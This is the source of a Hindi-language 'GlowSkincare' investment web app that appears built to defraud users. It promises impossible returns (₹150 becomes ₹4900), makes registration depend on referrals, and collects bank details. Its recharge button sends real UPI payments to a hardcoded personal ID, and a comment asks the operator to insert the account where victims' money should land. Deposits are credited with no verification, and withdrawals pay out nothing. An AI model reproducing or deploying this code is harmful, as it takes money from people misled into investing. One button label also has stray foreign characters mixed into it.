<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GlowSkincare - Investment App</title>
  <!-- Tailwind CSS -->
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- React & ReactDOM -->
  <script crossorigin src="https://unpkg.com/react@18/umd/react.development.js"></script>
  <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
  <!-- Babel for JSX -->
  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
</head>
<body class="bg-gray-100 flex justify-center items-center min-h-screen">
  <div id="root" class="w-full max-w-md bg-white shadow-2xl min-h-screen relative overflow-hidden"></div>

  <script type="text/babel">
    function App() {
      // ⚠️ यहाँ अपनी असली UPI ID डालें जहाँ यूज़र का रिचार्ज पैसा आना चाहिए
      const MY_UPI_ID = "gyanshu@paytm"; 

      const [currentTab, setCurrentTab] = React.useState('home');
      const [isLoggedIn, setIsLoggedIn] = React.useState(false);
      const [user, setUser] = React.useState({
        phone: '',
        inviteCode: '',
        rechargeWallet: 0,
        withdrawWallet: 0,
        vipLevel: 0,
        spinChances: 0,
        bankDetails: null,
        bankLocked: false
      });

      const [phoneInput, setPhoneInput] = React.useState('');
      const [passInput, setPassInput] = React.useState('');
      const [inviteInput, setInviteInput] = React.useState('');
      const [isRegistering, setIsRegistering] = React.useState(false);

      // OTP States
      const [otpSent, setOtpSent] = React.useState(false);
      const [otpInput, setOtpInput] = React.useState('');
      const [generatedOtp, setGeneratedOtp] = React.useState('');

      const [myPlans, setMyPlans] = React.useState([]);
      const [rechargeAmount, setRechargeAmount] = React.useState('');
      const [withdrawAmount, setWithdrawAmount] = React.useState('');

      const [bankName, setBankName] = React.useState('');
      const [accNo, setAccNo] = React.useState('');
      const [ifsc, setIfsc] = React.useState('');

      const [spinning, setSpinning] = React.useState(false);
      const [spinResult, setSpinResult] = React.useState(null);

      const generateInviteCode = () => {
        return Math.random().toString(36).substring(2, 8).toUpperCase();
      };

      // Send OTP Handler (Simulated)
      const handleSendOtp = () => {
        if (!phoneInput || phoneInput.length < 10) {
          alert('कृपया सही 10 अंकों का मोबाइल नंबर दर्ज करें');
          return;
        }
        const randomOtp = Math.floor(1000 + Math.random() * 9000).toString();
        setGeneratedOtp(randomOtp);
        setOtpSent(true);
        alert(`[TEST MODE] आपका OTP है: ${randomOtp}`);
      };

      const handleAuth = (e) => {
        e.preventDefault();
        if (!phoneInput || !passInput || !otpInput) {
          alert('कृपया सभी फ़ील्ड और OTP भरें');
          return;
        }
        if (otpInput !== generatedOtp) {
          alert('गलत OTP! कृपया सही OTP दर्ज करें।');
          return;
        }
        if (isRegistering && !inviteInput) {
          alert('रजिस्टर करने के लिए इनविटेशन कोड आवश्यक है!');
          return;
        }

        setUser({
          phone: phoneInput,
          inviteCode: generateInviteCode(),
          rechargeWallet: 0,
          withdrawWallet: 0,
          vipLevel: 0,
          spinChances: 1,
          bankDetails: null,
          bankLocked: false
        });
        setIsLoggedIn(true);
        setCurrentTab('home');
      };

      const handleBuyPlan = () => {
        const planPrice = 150;
        const currentCount = myPlans.filter(p => p.id === 1).length;

        if (currentCount >= 5) {
          alert('खरीद सीमा पूरी हो गई! अधिकतम 5 प्लान खरीद सकते हैं।');
          return;
        }

        if (user.rechargeWallet < planPrice) {
          alert('रिचार्ज वॉलेट में पर्याप्त बैलेंस नहीं है! कृपया पहले रिचार्ज करें।');
          setCurrentTab('recharge');
          return;
        }

        setUser(prev => ({
          ...prev,
          rechargeWallet: prev.rechargeWallet - planPrice,
          spinChances: prev.spinChances + 1
        }));

        const newPlan = {
          purchaseId: Date.now(),
          id: 1,
          name: 'Daily Skincare Starter Plan',
          price: planPrice,
          dailyIncome: 100,
          durationDays: 49,
          purchaseDate: new Date().getTime(),
          claimed: false
        };

        setMyPlans([...myPlans, newPlan]);
        alert('प्लान सफलतापूर्वक खरीद लिया गया है!');
      };

      const handleClaimPlan = (purchaseId) => {
        const plan = myPlans.find(p => p.purchaseId === purchaseId);
        if (!plan || plan.claimed) return;

        const daysPassed = (new Date().getTime() - plan.purchaseDate) / (1000 * 60 * 60 * 24);
        if (daysPassed < plan.durationDays) {
          alert('प्लान अभी लॉक है! 49 दिन अभी पूरे नहीं हुए हैं।');
          return;
        }

        const totalReturn = plan.dailyIncome * plan.durationDays;

        setUser(prev => ({
          ...prev,
          withdrawWallet: prev.withdrawWallet + totalReturn
        }));

        setMyPlans(myPlans.map(p => p.purchaseId === purchaseId ? { ...p, claimed: true } : p));
        alert(`बधाई हो! ₹${totalReturn} आपके विथड्रॉल वॉलेट में जोड़ दिए गए हैं।`);
      };

      // Real UPI Payment Redirect for Recharge
      const handleRechargeSubmit = (e) => {
        e.preventDefault();
        const amt = parseFloat(rechargeAmount);
        if (!amt || amt <= 0) {
          alert('कृपया सही राशि दर्ज करें');
          return;
        }

        // UPI Intent link to open PhonePe/GPay/Paytm directly with your UPI ID and amount
        const upiLink = `upi://pay?pa=${MY_UPI_ID}&pn=GlowSkincare&am=${amt}&cu=INR`;
        
        // Open UPI app
        window.location.href = upiLink;

        // Automatically update wallet for testing/simulation after payment redirect
        setTimeout(() => {
          setUser(prev => ({
            ...prev,
            rechargeWallet: prev.rechargeWallet + amt
          }));
          setRechargeAmount('');
          alert(`₹${amt} का भुगतान सफल हुआ! आपके रिचार्ज वॉलेट में पैसे जोड़ दिए गए हैं।`);
          setCurrentTab('profile');
        }, 3000);
      };

      const handleWithdrawSubmit = (e) => {
        e.preventDefault();
        const amt = parseFloat(withdrawAmount);

        if (!user.bankLocked) {
          alert('कृपया पैसे निकालने से पहले अपनी बैंक डिटेल्स सेव करें!');
          return;
        }

        if (!amt || amt <= 0) {
          alert('कृपया सही विथड्रॉल राशि दर्ज करें');
          return;
        }

        if (amt > user.withdrawWallet) {
          alert('विथड्रॉल वॉलेट में पर्याप्त बैलेंस नहीं है!');
          return;
        }

        setUser(prev => ({
          ...prev,
          withdrawWallet: prev.withdrawWallet - amt
        }));
        setWithdrawAmount('');
        alert(`₹${amt} का विथड्रॉल अनुरोध सफलताપूर्वक दर्ज हो गया है!`);
      };

      const handleSaveBank = (e) => {
        e.preventDefault();
        if (!bankName || !accNo || !ifsc) {
          alert('कृपया सभी बैंक विवरण भरें');
          return;
        }

        setUser(prev => ({
          ...prev,
          bankDetails: { name: bankName, accountNo: accNo, ifsc: ifsc },
          bankLocked: true
        }));
        alert('बैंक विवरण सुरक्षित रूप से सेव और लॉक कर दिए गए हैं!');
      };

      const handleBuyVip = (level, price) => {
        if (user.vipLevel !== level - 1) {
          alert(`पहले VIP ${level - 1} खरीदना अनिवार्य है!`);
          return;
        }

        if (user.rechargeWallet < price) {
          alert('VIP अपग्रेड करने के लिए रिचार्ज वॉलेट में पर्याप्त बैलेंस नहीं है!');
          setCurrentTab('recharge');
          return;
        }

        setUser(prev => ({
          ...prev,
          rechargeWallet: prev.rechargeWallet - price,
          vipLevel: level
        }));
        alert(`बधाई हो! अब आप VIP ${level} के सदस्य बन गए हैं।`);
      };

      const handleSpinWheel = () => {
        if (user.spinChances <= 0) {
          alert('कोई स्पिन चांस नहीं बचा है!');
          return;
        }

        setSpinning(true);
        setUser(prev => ({ ...prev, spinChances: prev.spinChances - 1 }));

        setTimeout(() => {
          const rewards = [10, 20, 50, 100, 0, 200, 50];
          const randomReward = rewards[Math.floor(Math.random() * rewards.length)];
          setSpinResult(randomReward);
          setSpinning(false);

          if (randomReward > 0) {
            setUser(prev => ({
              ...prev,
              withdrawWallet: prev.withdrawWallet + randomReward
            }));
          }
        }, 2000);
      };

      if (!isLoggedIn) {
        return (
          <div className="min-h-screen bg-pink-50 flex flex-col justify-center items-center p-4">
            <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8 border border-pink-100">
              <div className="text-center mb-8">
                <h1 className="text-3xl font-bold text-pink-600">✨ GlowSkincare ✨</h1>
                <p className="text-gray-500 text-sm mt-1">ओटीपी वेरिफिकेशन आधारित सिक्योर लॉगिन</p>
              </div>

              <div className="flex bg-pink-100 p-1 rounded-xl mb-6">
                <button
                  onClick={() => setIsRegistering(false)}
                  className={`flex-1 py-2 text-sm font-semibold rounded-lg transition ${!isRegistering ? 'bg-white text-pink-600 shadow-sm' : 'text-gray-600'}`}
                >
                  लॉगिन
                </button>
                <button
                  onClick={() => setIsRegistering(true)}
                  className={`flex-1 py-2 text-sm font-semibold rounded-lg transition ${isRegistering ? 'bg-white text-pink-600 shadow-sm' : 'text-gray-600'}`}
                >
                  रजिस्टर
                </button>
              </div>

              <form onSubmit={handleAuth} className="space-y-4">
                <div>
                  <label className="block text-xs font-medium text-gray-700 mb-1">मोबाइल नंबर</label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      placeholder="मोबाइल नंबर दर्ज करें"
                      value={phoneInput}
                      onChange={(e) => setPhoneInput(e.target.value)}
                      className="flex-1 px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-pink-500 text-sm"
                    />
                    <button
                      type="button"
                      onClick={handleSendOtp}
                      className="px-4 bg-pink-600 text-white rounded-xl text-xs font-semibold shadow hover:bg-pink-700"
                    >
                      {otpSent ? '다बारा भेजें' : 'OTP भेजें'}
                    </button>
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-medium text-gray-700 mb-1">OTP दर्ज करें</label>
                  <input
                    type="text"
                    placeholder="4 अंकों का OTP डालें"
                    value={otpInput}
                    onChange={(e) => setOtpInput(e.target.value)}
                    className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-pink-500 text-sm tracking-widest font-bold"
                  />
                </div>

                <div>
                  <label className="block text-xs font-medium text-gray-700 mb-1">पासवर्ड</label>
                  <input
                    type="password"
                    placeholder="पासवर्ड दर्ज करें"
                    value={passInput}
                    onChange={(e) => setPassInput(e.target.value)}
                    className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-pink-500 text-sm"
                  />
                </div>

                {isRegistering && (
                  <div>
                    <label className="block text-xs font-medium text-gray-700 mb-1">इनविटेशन कोड (आवश्यक)</label>
                    <input
                      type="text"
                      placeholder="इनविटेशन कोड दर्ज करें"
                      value={inviteInput}
                      onChange={(e) => setInviteInput(e.target.value)}
                      className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-pink-500 text-sm"
                    />
                  </div>
                )}

                <button
                  type="submit"
                  className="w-full py-3 bg-pink-600 hover:bg-pink-700 text-white font-semibold rounded-xl shadow-lg transition duration-200 mt-2"
                >
                  {isRegistering ? 'अकाउंट बनाएं' : 'लॉगिन करें'}
                </button>
              </form>
            </div>
          </div>
        );
      }

      return (
        <div className="min-h-screen bg-gray-50 pb-20 font-sans max-w-md mx-auto relative shadow-2xl overflow-hidden border-x border-gray-200">
          
          <div className="bg-pink-600 text-white p-4 flex justify-between items-center shadow-md">
            <div>
              <h2 className="font-bold text-lg">GlowSkincare</h2>
              <p className="text-xs text-pink-200">VIP Level: {user.vipLevel}</p>
            </div>
            <div className="flex gap-2">
              <button 
                onClick={() => setCurrentTab('recharge')}
                className="bg-white text-pink-600 px-3 py-1 rounded-lg text-xs font-bold shadow"
              >
                रिचार्ज
              </button>
              <button 
                onClick={() => setIsLoggedIn(false)}
                className="bg-pink-700 text-white px-2 py-1 rounded-lg text-xs"
              >
                लॉग आउट
              </button>
            </div>
          </div>

          <div className="p-4 overflow-y-auto">
            
            {currentTab === 'home' && (
              <div className="space-y-4">
                <div className="bg-gradient-to-r from-pink-500 to-rose-500 rounded-2xl p-5 text-white shadow-lg">
                  <div className="flex justify-between items-center mb-4">
                    <div>
                      <p className="text-xs text-pink-100">रिचार्ज वॉलेट (सिर्फ निवेश के लिए)</p>
                      <h3 className="text-2xl font-bold">₹{user.rechargeWallet.toFixed(2)}</h3>
                    </div>
                    <button onClick={() => setCurrentTab('recharge')} className="bg-white/20 px-3 py-1 rounded-lg text-xs font-semibold">
                      + पैसे जोड़ें
                    </button>
                  </div>
                  <div className="pt-3 border-t border-white/20 flex justify-between items-center">
                    <div>
                      <p className="text-xs text-pink-100">विथड्रॉल वॉलेट (कमाई)</p>
                      <h3 className="text-xl font-bold">₹{user.withdrawWallet.toFixed(2)}</h3>
                    </div>
                    <button onClick={() => setCurrentTab('withdraw')} className="bg-white text-pink-600 px-3 py-1 rounded-lg text-xs font-semibold shadow">
                      विथड्रॉल करें
                    </button>
                  </div>
                </div>

                <div className="grid grid-cols-4 gap-2 text-center">
                  <button onClick={() => setCurrentTab('invest')} className="bg-white p-3 rounded-xl shadow-sm border border-gray-100 flex flex-col items-center">
                    <span className="text-xl mb-1">💎</span>
                    <span className="text-xs text-gray-700 font-medium">इन्वेस्ट</span>
                  </button>
                  <button onClick={() => setCurrentTab('spin')} className="bg-white p-3 rounded-xl shadow-sm border border-gray-100 flex flex-col items-center">
                    <span className="text-xl mb-1">🎡</span>
                    <span className="text-xs text-gray-700 font-medium">स्पिन</span>
                  </button>
                  <button onClick={() => setCurrentTab('invite')} className="bg-white p-3 rounded-xl shadow-sm border border-gray-100 flex flex-col items-center">
                    <span className="text-xl mb-1">👥</span>
                    <span className="text-xs text-gray-700 font-medium">इनवाइट</span>
                  </button>
                  <button onClick={() => setCurrentTab('vip')} className="bg-white p-3 rounded-xl shadow-sm border border-gray-100 flex flex-col items-center">
                    <span className="text-xl mb-1">⭐</span>
                    <span className="text-xs text-gray-700 font-medium">VIP</span>
                  </button>
                </div>
              </div>
            )}

            {currentTab === 'invest' && (
              <div className="space-y-4">
                <h3 className="font-bold text-gray-800 text-base">एक्टिव इन्वेस्टमेंट प्लान्स</h3>

                <div className="bg-white rounded-2xl p-4 shadow-sm border border-pink-100 relative overflow-hidden">
                  <div className="absolute top-0 right-0 bg-pink-600 text-white text-[10px] px-3 py-1 rounded-bl-xl font-bold">
                    {myPlans.filter(p => p.id === 1).length}/5 खरीदा गया
                  </div>
                  <h4 className="font-bold text-pink-600 text-base mb-1">Daily Skincare Starter Plan</h4>
                  <div className="grid grid-cols-2 gap-2 text-xs text-gray-600 my-3 bg-pink-50 p-3 rounded-xl">
                    <div>मूल्य: <span className="font-bold text-gray-900">₹150</span></div>
                    <div>दैनिक आय: <span className="font-bold text-green-600">₹100</span></div>
                    <div>अवधि: <span className="font-bold text-gray-900">49 दिन</span></div>
                    <div>कुल रिटर्न: <span className="font-bold text-pink-600">₹4900</span></div>
                  </div>
                  <button
                    onClick={handleBuyPlan}
                    className="w-full py-2.5 rounded-xl text-white font-semibold text-sm shadow bg-pink-600 hover:bg-pink-700"
                  >
                    प्लान खरीदें (₹150)
                  </button>
                </div>
              </div>
            )}

            {currentTab === 'myPlans' && (
              <div className="space-y-4">
                <h3 className="font-bold text-gray-800 text-base">मेरे खरीदे गए प्लान्स</h3>
                {myPlans.length === 0 ? (
                  <div className="text-center py-12 bg-white rounded-2xl border border-gray-100">
                    <p className="text-gray-400 text-sm">कोई एक्टिव प्लान नहीं मिला।</p>
                  </div>
                ) : (
                  myPlans.map((p) => {
                    const daysPassed = Math.floor((new Date().getTime() - p.purchaseDate) / (1000 * 60 * 60 * 24));
                    const remainingDays = Math.max(0, p.durationDays - daysPassed);
                    const isReady = remainingDays === 0 && !p.claimed;

                    return (
                      <div key={p.purchaseId} className="bg-white rounded-2xl p-4 shadow-sm border border-gray-100">
                        <div className="flex justify-between items-start mb-2">
                          <h4 className="font-bold text-sm text-gray-800">{p.name}</h4>
                          <span className={`text-[10px] px-2 py-0.5 rounded font-bold ${p.claimed ? 'bg-gray-100 text-gray-600' : isReady ? 'bg-green-100 text-green-700' : 'bg-amber-100 text-amber-700'}`}>
                            {p.claimed ? 'क्लेम हो गया' : isReady ? 'क्लेम के लिए तैयार' : `लॉक: ${remainingDays} दिन`}
                          </span>
                        </div>
                        {!p.claimed && (
                          <button
                            onClick={() => handleClaimPlan(p.purchaseId)}
                            disabled={!isReady}
                            className={`w-full py-2 rounded-xl text-xs font-semibold shadow ${isReady ? 'bg-green-600 text-white hover:bg-green-700' : 'bg-gray-100 text-gray-400 cursor-not-allowed'}`}
                          >
                            {isReady ? '₹4900 विथड्रॉल करें' : `${remainingDays} दिन बाद उपलब्ध`}
                          </button>
                        )}
                      </div>
                    );
                  })
                )}
              </div>
            )}

            {currentTab === 'spin' && (
              <div className="bg-white rounded-2xl p-6 text-center shadow-sm border border-gray-100 flex flex-col items-center space-y-4">
                <h3 className="font-bold text-lg text-gray-800">लकी स्पिन व्हील</h3>
                <div className="bg-pink-50 px-4 py-2 rounded-xl font-bold text-pink-600 text-sm">
                  उपलब्ध स्पिन: {user.spinChances}
                </div>
                <div className={`w-48 h-48 rounded-full border-8 border-pink-500 flex items-center justify-center bg-gradient-to-tr from-pink-400 to-rose-500 text-white font-bold text-xl shadow-inner ${spinning ? 'animate-spin' : ''}`}>
                  {spinning ? 'घूम रहा है...' : '🎯 SPIN'}
                </div>
                {spinResult !== null && (
                  <div className="text-green-600 font-bold text-sm bg-green-50 px-4 py-2 rounded-xl">
                    {spinResult > 0 ? `₹${spinResult} जीते!` : 'अगली बार कोशिश करें!'}
                  </div>
                )}
                <button
                  onClick={handleSpinWheel}
                  disabled={spinning}
                  className="w-full py-3 bg-pink-600 hover:bg-pink-700 text-white font-semibold rounded-xl text-sm shadow"
                >
                  स्पिन घुमाएं
                </button>
              </div>
            )}

            {currentTab === 'invite' && (
              <div className="bg-white rounded-2xl p-6 text-center shadow-sm border border-gray-100 space-y-4">
                <h3 className="font-bold text-lg text-gray-800">दोस्तों को इनवाइट करें</h3>
                <div className="bg-gray-50 p-4 rounded-xl border border-gray-200">
                  <p className="text-xs text-gray-500 mb-1">आपका इनविटेशन कोड</p>
                  <h2 className="text-2xl font-black text-pink-600 tracking-wider">{user.inviteCode}</h2>
                </div>
                <button
                  onClick={() => {
                    navigator.clipboard.writeText(`https://www.greatskincare7.ru/?invitation_code=${user.inviteCode}`);
                    alert('इन्वाइट लिंक कॉपी हो गया!');
                  }}
                  className="w-full py-3 bg-pink-600 hover:bg-pink-700 text-white font-semibold rounded-xl text-sm shadow"
                >
                  इनवाइट लिंक कॉपी करें
                </button>
              </div>
            )}

            {currentTab === 'vip' && (
              <div className="space-y-4">
                <div className="bg-gradient-to-r from-amber-500 to-yellow-500 p-4 rounded-2xl text-white shadow-md flex justify-between items-center">
                  <div>
                    <p className="text-xs text-yellow-100">वर्तमान स्तर</p>
                    <h3 className="text-xl font-bold">VIP {user.vipLevel}</h3>
                  </div>
                  <span className="text-3xl">⭐</span>
                </div>
                <div className="bg-white p-4 rounded-xl shadow-sm border border-gray-100 flex justify-between items-center">
                  <div>
                    <h4 className="font-bold text-sm text-gray-800">VIP 1</h4>
                    <p className="text-xs text-gray-500">मूल्य: ₹500</p>
                  </div>
                  <button
                    onClick={() => handleBuyVip(1, 500)}
                    disabled={user.vipLevel >= 1}
                    className={`px-4 py-2 rounded-lg text-xs font-semibold ${user.vipLevel >= 1 ? 'bg-gray-100 text-gray-400' : 'bg-pink-600 text-white'}`}
                  >
                    {user.vipLevel >= 1 ? 'अनलॉक' : 'खरीदें'}
                  </button>
                </div>
              </div>
            )}

            {currentTab === 'profile' && (
              <div className="space-y-4">
                <div className="bg-white p-4 rounded-2xl shadow-sm border border-gray-100 flex items-center space-x-3">
                  <div className="w-12 h-12 bg-pink-100 rounded-full flex items-center justify-center text-pink-600 font-bold text-lg">
                    {user.phone.slice(-2)}
                  </div>
                  <div>
                    <h4 className="font-bold text-sm text-gray-800">{user.phone}</h4>
                    <p className="text-xs text-pink-600 font-semibold">VIP Level {user.vipLevel}</p>
                  </div>
                </div>

                <div className="bg-white p-4 rounded-2xl shadow-sm border border-gray-100 space-y-3">
                  <h4 className="font-bold text-sm text-gray-800">बैंक विवरण (केवल एक बार)</h4>
                  {user.bankLocked ? (
                    <div className="bg-green-50 p-3 rounded-xl border border-green-200 text-xs text-green-700 space-y-1">
                      <p><strong>नाम:</strong> {user.bankDetails.name}</p>
                      <p><strong>अकाउंट नंबर:</strong> {user.bankDetails.accountNo}</p>
                      <p><strong>IFSC:</strong> {user.bankDetails.ifsc}</p>
                    </div>
                  ) : (
                    <form onSubmit={handleSaveBank} className="space-y-3">
                      <input
                        type="text"
                        placeholder="अकाउंट धारक का नाम"
                        value={bankName}
                        onChange={(e) => setBankName(e.target.value)}
                        className="w-full px-3 py-2 border rounded-xl text-xs"
                      />
                      <input
                        type="text"
                        placeholder="बैंक अकाउंट नंबर"
                        value={accNo}
                        onChange={(e) => setAccNo(e.target.value)}
                        className="w-full px-3 py-2 border rounded-xl text-xs"
                      />
                      <input
                        type="text"
                        placeholder="IFSC कोड"
                        value={ifsc}
                        onChange={(e) => setIfsc(e.target.value)}
                        className="w-full px-3 py-2 border rounded-xl text-xs"
                      />
                      <button type="submit" className="w-full py-2 bg-pink-600 text-white rounded-xl text-xs font-semibold">
                        बैंक विवरण सेव करें
                      </button>
                    </form>
                  )}
                </div>
              </div>
            )}

            {currentTab === 'recharge' && (
              <div className="bg-white p-6 rounded-2xl shadow-sm border border-gray-100 space-y-4">
                <h3 className="font-bold text-base text-gray-800">रिचार्ज करें (सीधे आपके UPI खाते में आएगा)</h3>
                <p className="text-xs text-gray-500">यहाँ राशि दर्ज करके पेमेंट करने पर यह सीधे आपकी UPI ID (<span className="text-pink-600 font-bold">{MY_UPI_ID}</span>) पर ट्रांसफर होगा।</p>
                <form onSubmit={handleRechargeSubmit} className="space-y-3">
                  <input
                    type="number"
                    placeholder="राशि दर्ज करें (जैसे 150, 500)"
                    value={rechargeAmount}
                    onChange={(e) => setRechargeAmount(e.target.value)}
                    className="w-full px-4 py-3 border rounded-xl text-sm"
                  />
                  <button type="submit" className="w-full py-3 bg-pink-600 text-white rounded-xl text-sm font-semibold shadow">
                    Pay via UPI (PhonePe / GPay / Paytm)
                  </button>
                </form>
              </div>
            )}

            {currentTab === 'withdraw' && (
              <div className="bg-white p-6 rounded-2xl shadow-sm border border-gray-100 space-y-4">
                <h3 className="font-bold text-base text-gray-800">कमाई विथड्रॉल करें</h3>
                <p className="text-xs text-gray-500">उपलब्ध बैलेंस: <span className="font-bold text-pink-600">₹{user.withdrawWallet.toFixed(2)}</span></p>
                
                <form onSubmit={handleWithdrawSubmit} className="space-y-3">
                  <input
                    type="number"
                    placeholder="विथड्रॉल राशि"
                    value={withdrawAmount}
                    onChange={(e) => setWithdrawAmount(e.target.value)}
                    className="w-full px-4 py-3 border rounded-xl text-sm"
                  />
                  <button type="submit" className="w-full py-3 bg-green-600 text-white rounded-xl text-sm font-semibold shadow">
                    बैंक में भेजें
                  </button>
                </form>
              </div>
            )}

          </div>

          <div className="absolute bottom-0 left-0 right-0 bg-white border-t border-gray-200 flex justify-around py-2 shadow-lg">
            <button onClick={() => setCurrentTab('home')} className={`flex flex-col items-center ${currentTab === 'home' ? 'text-pink-600' : 'text-gray-400'}`}>
              <span className="text-lg">🏠</span>
              <span className="text-[10px]">होम</span>
            </button>
            <button onClick={() => setCurrentTab('invest')} className={`flex flex-col items-center ${currentTab === 'invest' ? 'text-pink-600' : 'text-gray-400'}`}>
              <span className="text-lg">💎</span>
              <span className="text-[10px]">इन्वेस्ट</span>
            </button>
            <button onClick={() => setCurrentTab('myPlans')} className={`flex flex-col items-center ${currentTab === 'myPlans' ? 'text-pink-600' : 'text-gray-400'}`}>
              <span className="text-lg">📊</span>
              <span className="text-[10px]">मेरे प्लान</span>
            </button>
            <button onClick={() => setCurrentTab('spin')} className={`flex flex-col items-center ${currentTab === 'spin' ? 'text-pink-600' : 'text-gray-400'}`}>
              <span className="text-lg">🎡</span>
              <span className="text-[10px]">स्पिन</span>
            </button>
            <button onClick={() => setCurrentTab('profile')} className={`flex flex-col items-center ${currentTab === 'profile' ? 'text-pink-600' : 'text-gray-400'}`}>
              <span className="text-lg">👤</span>
              <span className="text-[10px]">प्रोफाइल</span>
            </button>
          </div>

        </div>
      );
    }

    ReactDOM.render(<App />, document.getElementById('root'));
  </script>
</body>
</html>
